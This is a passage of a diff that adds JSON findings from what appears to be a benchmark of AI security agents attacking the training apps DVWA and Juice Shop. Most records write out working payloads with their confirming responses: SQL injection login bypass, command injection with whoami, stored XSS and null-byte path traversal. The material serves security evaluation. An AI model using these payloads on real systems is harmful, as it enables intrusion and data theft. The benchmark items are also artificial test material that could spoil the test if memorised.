+    "response_evidence": "[security=medium] TRUE payload id=1 OR 1=1 returned 5 seeded records: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) as shown in pre_blocks: \"ID: 1 OR 1=1\\nFirst name: admin\\nSurname: admin\" ... through Surname: Smith. FALSE payload id=1 AND 1=2 returned zero records (no pre_blocks, visible_text shows only the dropdown with no ID/First name/Surname output). This confirms the numeric (unquoted) boolean injection bypasses medium-level quote-escaping since id is submitted as an unquoted integer in the SQL query. DVWA security_level confirmed as 'medium' via session_info on all requests.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0124",
+    "target": "dvwa",
+    "endpoint_url": "/vulnerabilities/sqli/session-input.php",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input id parameter (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' # & Submit=Submit  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin)  -> TRUE case",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' # & Submit=Submit  (session=dvwa_admin)",
+      "GET http://dvwa/vulnerabilities/sqli/  (session=dvwa_admin)  -> FALSE case"
+    ],
+    "response_evidence": "[security=high] Confirmed page footer shows 'Security Level: high' throughout. TRUE payload `1' OR '1'='1' #` submitted via session-input.php, then GET /vulnerabilities/sqli/ returned 5 seeded records with distinct surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (raw pre_blocks each echoing \"ID: 1' OR '1'='1' #\\nFirst name: ...\\nSurname: ...\"). FALSE control payload `1' AND '1'='2' #` submitted via session-input.php, then GET /vulnerabilities/sqli/ returned zero pre_blocks / no ID-First name-Surname records (visible_text only shows the 'Click here to change your ID' link and no result rows). This confirms the out-of-band session-stored id is interpolated unsanitized into a SQL query with an appended LIMIT 1 clause, requiring the trailing '#' comment to neutralize it, consistent with the high-security SQLi bypass technique.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0125",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored XSS via 'mtxMessage' field in DVWA Guestbook (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'test', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] POST request succeeded (HTTP 200) and the payload was accepted (mtxMessage maxlength=50 accommodated the 34-char canary). Upon re-navigating to the guestbook page with Playwright, the injected <script id=\\\"test_token\\\"> tag executed client-side JavaScript. browser_eval_js('window.xss_flag') returned 1, and browser_read_dom confirmed the script element with id='test_token' and inner content 'window.xss_flag=1' is rendered unescaped in the DOM, proving the message field is stored and reflected without sanitization/encoding, resulting in persistent XSS execution.",
+    "browser_js_evidence": "window.xss_flag === 1 (confirmed via browser_eval_js expression 'window.xss_flag' returning result: 1)"
+  },
+  {
+    "blind_id": "BLIND-0126",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/products/search",
+    "method": "GET",
+    "parameter": "q",
+    "cwe": "CWE-89",
+    "title": "Product Search SQL Injection via q parameter (UNION-based)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/products/search?q=qwert%27  (session=unauth)",
+      "GET http://juiceshop:3000/rest/products/search?q=x%27%29%29+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--  (session=unauth)"
+    ],
+    "response_evidence": "Step1: HTTP 500, body visible_text: 'Error: SQLITE_ERROR: near \"'%'\": syntax error OWASP Juice Shop (Express ^4.17.1) 500 Error: SQLITE_ERROR: near \"'%'\": syntax error' — confirms single quote breaks out of SQL query and is reflected unsanitized into the backend SQLite query (SQLi presence). Step2: HTTP 200, body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} — the returned record's fields are literally the integers 1-9 supplied in the UNION SELECT clause, proving the injected UNION SELECT 1,2,3,4,5,6,7,8,9-- was executed by the backend in place of the original product query, with no SQL error. Both the error-based and UNION-based behavioral criteria are satisfied, confirming exploitable SQL injection in the product search endpoint.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0127",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via pipe in ip parameter at DVWA medium security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ with form_data={ip: '127.0.0.1| whoami', Submit: 'Submit'} (session=dvwa_admin, security=medium)"
+    ],
+    "response_evidence": "[security=medium] Payload ip=127.0.0.1| whoami bypassed the medium-level blacklist (which strips ';' and '&&' but not '|') and the server executed the chained whoami command. Response visible_text/pre_blocks contain literal output 'www-data' immediately following the ping output section, confirming the web process identity was disclosed via injected command execution on the medium security level.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0128",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Authentication Bypass via SQL Injection in Login Email Field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://juiceshop:3000/rest/user/login\\nContent-Type: application/json\\n\\n{\"email\": \"' OR 1=1--\", \"password\": \"anything\"}"
+    ],
+    "response_evidence": "HTTP 200 response body: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload `' OR 1=1--` comments out the password check in the backend SQL query, causing it to match the first user row (umail: admin@juice-sh.op, bid: 1 - admin's basket id) and issue a valid signed JWT authentication token for that account without knowing the real password. This confirms classic SQLi-based authentication bypass.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0129",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/premium.key",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption Key File - premium.key readable without authentication",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/premium.key (session=unauth, no Authorization header)"
+    ],
+    "response_evidence": "HTTP 200, Content-Type: application/octet-stream. Body content retrieved directly (not an HTML error page): \\\"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42\\\\n\\\" - this is the premium-membership activation key material used by Juice Shop's premium feature unlock logic, exposed via directory that should not be web-accessible. Confirms CWE-548 exposed sensitive key file, supplementing the prior /encryptionkeys/ directory listing finding by proving the listed file's actual content is retrievable.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0130",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean payload on id POST field (DVWA medium)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} [security=medium]",
+      "POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} [security=medium]"
+    ],
+    "response_evidence": "[security=medium] Confirmed page banner 'Security Level: medium' on both responses. TRUE payload id='1 OR 1=1' returned 5 distinct seeded records: (First name: admin, Surname: admin), (Gordon, Brown), (Hack, Me), (Pablo, Picasso), (Bob, Smith) — i.e. the entire users table was dumped, proving the numeric value is concatenated unescaped into the SQL WHERE clause (quotes are escaped at medium but no input validation/casting is applied to numeric payloads). FALSE payload id='1 AND 1=2' returned zero ID/First name/Surname records (only the User ID selector was present, no pre_blocks). This TRUE/FALSE differential confirms unsanitized SQL injection via the numeric path at medium security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0131",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/ (id stored out-of-band via /vulnerabilities/sqli/session-input.php)",
+    "method": "POST+GET",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via out-of-band session-input.php id parameter [security=high]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' OR '1'='1' #&Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/",
+      "POST http://dvwa/vulnerabilities/sqli/session-input.php  body: id=1' AND '1'='2' #&Submit=Submit",
+      "GET http://dvwa/vulnerabilities/sqli/"
+    ],
+    "response_evidence": "[security=high] Confirmed security_level=high via session_info in responses. TRUE payload (1' OR '1'='1' #) stored via session-input.php, then GET /vulnerabilities/sqli/ returned 5 records (multiple seeded users), surnames: admin, Brown, Me, Picasso, Smith -- e.g. pre_blocks: [\"ID: 1' OR '1'='1' #\\nFirst name: admin\\nSurname: admin\", \"...Gordon/Brown\", \"...Hack/Me\", \"...Pablo/Picasso\", \"...Bob/Smith\"]. FALSE payload (1' AND '1'='2' #) stored via session-input.php, then GET /vulnerabilities/sqli/ returned zero records (visible_text shows no ID/First name/Surname lines, pre_blocks empty). This satisfies the TRUE-returns-multiple-rows / FALSE-returns-zero-rows behavioral criterion for out-of-band SQLi at high security.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0132",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via 'ip' parameter in Ping utility (DVWA low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ body: ip=127.0.0.1; whoami&Submit=Submit (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] Payload ip=127.0.0.1; whoami caused the application to execute the chained shell command after the ping. Response body included normal ping output (PING 127.0.0.1 ... 4 packets transmitted, 4 received, 0% packet loss ...) immediately followed on its own line by the output of the injected 'whoami' command: 'www-data'. This confirms unsanitized shell command injection yielding web-process identity disclosure.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0133",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Authentication Bypass via SQL Injection in Login Endpoint",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://juiceshop:3000/rest/user/login\nContent-Type: application/json\n\n{\"email\": \"' OR 1=1--\", \"password\": \"anything\"}"
+    ],
+    "response_evidence": "HTTP 200 response returned a valid authentication object: {\\\"authentication\\\":{\\\"token\\\":\\\"[REDACTED_JWT]\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}. The injected email payload `' OR 1=1--` comments out the password check in the backend SQL query, causing the query to match the first user record (admin@juice-sh.op, likely id=1) regardless of the supplied password (\\\"anything\\\"). The returned `umail` field confirms authentication was granted for the admin account without knowing its real credentials, and a signed JWT token was issued — proving a full authentication bypass via SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0134",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/api/Feedbacks",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-359",
+    "title": "Unauthenticated User-Feedback endpoint discloses PII (partially masked emails + UserId linkage)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/api/Feedbacks (unauth, no auth cookies/headers)"
+    ],
+    "response_evidence": "HTTP 200 with no authentication supplied. Response JSON data array contains 8 feedback records, several including partially-masked but still partially-revealing email addresses embedded in the comment text along with numeric UserId linkage, e.g.: comment \\\"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)\\\" with UserId:1; \\\"Great shop! Awesome service! (***@juice-sh.op)\\\" UserId:2; \\\"Nothing useful available here! (***der@juice-sh.op)\\\" UserId:3; \\\"...(***ereum@juice-sh.op)\\\" UserId:21. This confirms the unauthenticated endpoint discloses user feedback records tied to UserId with partial email PII, without requiring any authentication.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0135",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal / Extension Filter Bypass under /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET /ftp/package.json.bak (unauth)",
+      "GET /ftp/package.json.bak%2500.md (unauth)"
+    ],
+    "response_evidence": "Request 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() middleware, proving the .bak extension is blocklisted for direct access. Request 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200 with content-type application/octet-stream and the full contents of the restricted package.json file, e.g. '{\\\"name\\\": \\\"juice-shop\\\", \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\", \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\", ...}' including dependencies, devDependencies, repository info, etc. This confirms the extension-check filter is bypassed via a poison null byte, allowing retrieval of the restricted .bak backup file content despite the apparent .md extension.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0136",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak%2500.md",
+    "method": "GET",
+    "parameter": "path",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal bypasses .bak extension filter in /ftp/",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak (unauth) -> HTTP 403 'Error: Only .md and .pdf files are allowed!'",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md (unauth) -> HTTP 200 returns package.json content"
+    ],
+    "response_evidence": "Request 1: GET /ftp/package.json.bak returned HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' (fileServer.js extension filter rejects .bak).\nRequest 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte + allowed .md extension appended) returned HTTP 200, content-type application/octet-stream, with body being the actual package.json file content: '{\\\"name\\\": \\\"juice-shop\\\", \\\"version\\\": \\\"6.2.0-SNAPSHOT\\\", \\\"description\\\": \\\"An intentionally insecure JavaScript Web Application\\\", ... \\\"dependencies\\\": {...}}'. This proves the extension allow-list filter checks only the trailing string (.md) while the underlying filesystem read truncates the path at the null byte, serving the restricted .bak file content. Both required conditions (403 on raw path, 200 with actual restricted file content on null-byte variant) are satisfied.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0137",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via numeric boolean bypass in 'id' POST field (DVWA medium security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> confirmed security_level=medium, id now rendered as <select> dropdown but underlying POST field name 'id' still accepted raw injected value",
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 OR 1=1', Submit: 'Submit'}  [TRUE condition]",
+      "POST http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) form_data={id: '1 AND 1=2', Submit: 'Submit'}  [FALSE condition]"
+    ],
+    "response_evidence": "[security=medium] TRUE payload id=1 OR 1=1 returned 5 seeded user records (multiple rows) with surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (pre_blocks list confirms 5 distinct ID/First name/Surname entries). FALSE payload id=1 AND 1=2 returned zero records — response visible_text/pre_blocks contained no 'ID:' result rows at all, only the empty form. This TRUE-returns-multiple-rows vs FALSE-returns-zero-rows behavioral difference, using numeric (unquoted) boolean payloads required because quotes are escaped server-side at medium, confirms exploitable SQL injection in the 'id' POST parameter at security_level=medium.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0138",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Authentication Bypass via SQL Injection in Login (email field)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://juiceshop:3000/rest/user/login {\"email\": \"' OR 1=1--\", \"password\": \"anything\"}"
+    ],
+    "response_evidence": "Response HTTP 200 with body {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email payload ' OR 1=1-- bypassed the password check by always evaluating the WHERE clause to true, and the server returned a valid signed authentication token along with \"umail\":\"admin@juice-sh.op\" and \"bid\":1 — confirming the first user record (admin@juice-sh.op) was authenticated without knowledge of the correct password. bid:1 also corresponds to admin's basket id, consistent with returning the first row of the users table ordered by id.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0139",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Login Authentication-Bypass SQL Injection via email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /rest/user/login session=unauth json_body={\"email\": \"' OR 1=1--\", \"password\": \"anything\"} -> HTTP 200"
+    ],
+    "response_evidence": "Response body: {\\\"authentication\\\":{\\\"token\\\":\\\"[REDACTED_JWT]\\\",\\\"bid\\\":1,\\\"umail\\\":\\\"admin@juice-sh.op\\\"}}. The injected email payload \\\"' OR 1=1--\\\" caused the backend SQL WHERE clause to always evaluate true, returning the first seeded user record (admin@juice-sh.op, bid=1) along with a valid authentication JWT token, despite the arbitrary/incorrect password supplied. This confirms a SQL injection authentication bypass returning a legitimate admin session token.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0140",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via 'ip' parameter in DVWA Command Injection page (low security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ form_data={ip: '127.0.0.1; whoami', Submit: 'Submit'} (session=dvwa_admin)"
+    ],
+    "response_evidence": "[security=low] Response body contained normal ping output for 127.0.0.1 (4 packets transmitted/received) followed directly by the injected command's output: 'www-data' appended on its own line after the ping statistics block. This is the identity of the web server process, confirming the semicolon-separated 'whoami' command was executed by the underlying shell via unsanitized 'ip' parameter concatenation.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0141",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via ip parameter using no-space pipe bypass (DVWA high security)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/  body: ip=127.0.0.1|whoami&Submit=Submit"
+    ],
+    "response_evidence": "[security=high] Page confirms 'Security Level: high'. Payload ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-security blacklist which blocks '; ', '| ' with trailing space, and '&&') was submitted. Response pre_blocks contain exactly: \"www-data\" — the web server process identity — proving successful command injection and execution of the chained whoami command on the host.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0142",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/security.php",
+    "method": "POST",
+    "parameter": "security, seclev_submit, user_token",
+    "cwe": "CWE-352",
+    "title": "DVWA Security Level Set to Low (functional confirmation only — CSRF not independently verified)",
+    "agent_verdict": "inconclusive",
+    "request_sequence": [
+      "GET http://dvwa/security.php (dvwa_admin) -> 200, extracted user_token=[REDACTED], security_level already 'low'",
+      "POST http://dvwa/security.php (dvwa_admin) body: security=low&seclev_submit=Submit&user_token=[REDACTED] -> 302 redirect to /security.php"
+    ],
+    "response_evidence": "[security=low] This task was assigned as a prerequisite step to establish security=low for subsequent tests, not as a CSRF vulnerability test. POST to /security.php with a freshly-fetched user_token succeeded (302 redirect, session_info.security_level='low', flash message 'Security level set to low' confirmed in subsequent page load). No CSRF bypass (e.g. omitting/reusing stale token, cross-origin request) was attempted, so CWE-352 exploitability was NOT verified — this finding only confirms the endpoint functions as expected for setting security level. Marking inconclusive since the suspected CWE-352 behavior was not behaviorally tested.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0143",
+    "target": "juiceshop",
+    "endpoint_url": "http://juiceshop:3000/encryptionkeys/",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-548",
+    "title": "Exposed Encryption-Keys Directory Listing Discloses premium.key and jwt.pub",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/encryptionkeys/ HTTP/1.1\n(unauthenticated session)"
+    ],
+    "response_evidence": "GET /encryptionkeys/ returned HTTP 200 with a browsable directory listing (content_type text/html) whose visible text reads: \\\"listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM\\\". The listing contains direct hyperlinks to http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. This satisfies the benchmark criteria: the directory is browsable (HTTP 200) and its listing exposes sensitive key files (premium.key, jwt.pub) without any authentication, constituting an information exposure of cryptographic key material (CWE-548).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0144",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/xss_s/",
+    "method": "POST",
+    "parameter": "mtxMessage",
+    "cwe": "CWE-79",
+    "title": "Stored Cross-Site Scripting via 'mtxMessage' field in DVWA Guestbook (security=low)",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/security.php (verified security_level=low via session_info)",
+      "POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'}",
+      "browser_navigate http://dvwa/vulnerabilities/xss_s/ (session=dvwa_admin)",
+      "browser_eval_js('window.xss_flag')",
+      "browser_read_dom('#test_token')"
+    ],
+    "response_evidence": "[security=low] The 50-character canary payload <script id=\\\"test_token\\\">window.xss_flag=1</script> was accepted by mtxMessage (maxlength=50, exact fit) and stored; subsequent GET of the guestbook page showed a new entry 'Name: tester' with the script content not HTML-escaped (rendered as executable markup rather than literal text, consistent with stored unsanitized injection).",
+    "browser_js_evidence": "browser_eval_js(\"window.xss_flag\") returned result=1, confirming the injected <script> tag executed in the DOM. browser_read_dom(\"#test_token\") returned inner_text/inner_html_excerpt = \"window.xss_flag=1\", confirming the injected script element with id=test_token was rendered and present in the live DOM of the authenticated admin session, proving stored XSS execution."
+  },
+  {
+    "blind_id": "BLIND-0145",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Login Authentication-Bypass SQL Injection via crafted email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /rest/user/login  session=unauth  json_body={\"email\": \"' OR 1=1--\", \"password\": \"anything\"} -> HTTP 200 {\"authentication\":{\"token\":\"[JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    ],
+    "response_evidence": "Submitting email=\\\"' OR 1=1--\\\" with an arbitrary password bypasses credential checking (the SQL WHERE clause becomes always-true and the trailing comment strips the password comparison and quote). The server responded HTTP 200 with a valid authentication JWT token and umail:\\\"admin@juice-sh.op\\\" and bid:1 (basket id 1, the first/admin user), proving the injection authenticated as the admin account without knowing its password. This matches the benchmark's confirmation criterion (valid token resolving to admin@juice-sh.op, the first seeded user).",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0146",
+    "target": "juiceshop",
+    "endpoint_url": "/ftp/package.json.bak",
+    "method": "GET",
+    "parameter": "",
+    "cwe": "CWE-22",
+    "title": "Poison Null-Byte Path Traversal Bypasses File Extension Filter on /ftp/ Endpoint",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/ftp/package.json.bak",
+      "GET http://juiceshop:3000/ftp/package.json.bak%2500.md"
+    ],
+    "response_evidence": "Request 1 (direct .bak path): HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' at fileServer.js:55 verify() — confirms extension allowlist filter blocks direct .bak access. Request 2 (poison null-byte bypass, encoded as %2500 which decodes to %00 literal 'null' followed by '.md'): HTTP 200, content-type application/octet-stream, body contains the full disclosed package.json backup file content (name: juice-shop, version 6.2.0-SNAPSHOT, dependencies list, devDependencies, repository URL, etc.) — proving the filter checks only the trailing '.md' extension string while the underlying filesystem read call truncates at the null byte and serves the restricted package.json.bak file. This is a confirmed path traversal / filter bypass disclosing a restricted backup file.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0147",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/sqli/",
+    "method": "POST",
+    "parameter": "id",
+    "cwe": "CWE-89",
+    "title": "SQL Injection via POST id parameter (numeric boolean bypass) at DVWA medium security",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 OR 1=1', Submit: 'Submit'} (session=dvwa_admin, security=medium)",
+      "POST http://dvwa/vulnerabilities/sqli/ with form_data={id: '1 AND 1=2', Submit: 'Submit'} (session=dvwa_admin, security=medium)"
+    ],
+    "response_evidence": "[security=medium] TRUE payload id=1 OR 1=1 returned 5 user records (all rows in the users table): 'ID: 1 OR 1=1 First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1 AND 1=2 returned zero records (page shows only the dropdown/User ID selector, no pre_blocks and no First name/Surname output). This confirms the id POST parameter is concatenated unescaped into a numeric SQL context on the medium security level (quotes are escaped via mysqli_real_escape_string but numeric injection bypasses this), allowing boolean-based SQL injection.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0148",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/user/login",
+    "method": "POST",
+    "parameter": "email",
+    "cwe": "CWE-89",
+    "title": "Login Authentication-Bypass SQL Injection via email field",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST /rest/user/login session=unauth body={\"email\":\"' OR 1=1--\",\"password\":\"anything\"} -> HTTP 200 {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}"
+    ],
+    "response_evidence": "POST to /rest/user/login with email payload `' OR 1=1--` and arbitrary password returned HTTP 200 (not 401) with a valid authentication object: {\"authentication\":{\"token\":\"[REDACTED_JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The returned identity \"umail\":\"admin@juice-sh.op\" confirms the SQL injection in the email field bypassed password verification and authenticated as the first user (admin) in the users table — the classic Juice Shop login bypass. A valid JWT auth token was issued without knowing admin's password, confirming CWE-89.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0149",
+    "target": "juiceshop",
+    "endpoint_url": "/rest/basket/6",
+    "method": "GET",
+    "parameter": "id (path)",
+    "cwe": "CWE-639",
+    "title": "Cross-User Basket Access (BOLA) via /rest/basket/{id}",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "GET http://juiceshop:3000/rest/basket/6  Authorization: Bearer <juiceshop_acct2 token>"
+    ],
+    "response_evidence": "HTTP 200 response authenticated as acct2 (own_basket_id=7, acct2_bench@juiceshop.local) returned acct1's basket data verbatim: {\\\"status\\\":\\\"success\\\",\\\"data\\\":{\\\"id\\\":6,\\\"coupon\\\":null,\\\"UserId\\\":22,...,\\\"Products\\\":[{\\\"id\\\":1,\\\"name\\\":\\\"Apple Juice (1000ml)\\\",...,\\\"BasketItem\\\":{\\\"ProductId\\\":1,\\\"BasketId\\\":6,\\\"id\\\":9,\\\"quantity\\\":3,...}}]}}. This matches acct1's known seeded basket (UserId=22, Apple Juice 1000ml, qty=3) and was retrieved using acct2's own auth token without any ownership/authorization check, confirming BOLA.",
+    "browser_js_evidence": null
+  },
+  {
+    "blind_id": "BLIND-0150",
+    "target": "dvwa",
+    "endpoint_url": "http://dvwa/vulnerabilities/exec/",
+    "method": "POST",
+    "parameter": "ip",
+    "cwe": "CWE-78",
+    "title": "OS Command Injection via unsanitized 'ip' parameter in DVWA Command Injection page [security=low]",
+    "agent_verdict": "confirmed",
+    "request_sequence": [
+      "POST http://dvwa/vulnerabilities/exec/ body=ip=127.0.0.1%3B+whoami&Submit=Submit (session=dvwa_admin)"
+    ],
